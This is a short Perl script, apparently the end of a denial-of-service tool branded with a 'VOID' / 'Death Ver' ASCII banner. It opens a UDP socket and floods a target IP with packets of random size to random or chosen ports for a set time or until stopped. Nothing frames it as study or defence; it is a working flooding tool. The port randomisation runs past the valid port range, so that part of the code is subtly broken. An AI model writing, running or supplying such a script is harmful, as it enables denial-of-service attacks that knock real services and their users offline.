$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print <<EOTEXT;










                                           _______________
                                          [  Death Ver ]                         
888     888  .d88888b. 8888888 8888888b.  
888     888 d88P" "Y88b  888   888  "Y88b 
888     888 888     888  888   888    888 
Y88b   d88P 888     888  888   888    888 
 Y88b d88P  888     888  888   888    888 
  Y88o88P   888     888  888   888    888 
   Y888P    Y88b. .d88P  888   888  .d88P 
    Y8P      "Y88888P" 8888888 8888888P"   
                                 (-==Perl Script==-)
								   
		                         
	                          [Stop with Ctrl-C]						     
								   
								   
								   
								   
								   
								   
EOTEXT

print "IP= $ip " . ($port ? $port : "Random") . " Bytes= " .
  ($size ? "$size" : "Disconnected!") .
  ($time ? " for $time seconds" : "") . "\n";
print "Stop with Ctrl-C\n" unless $time;

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
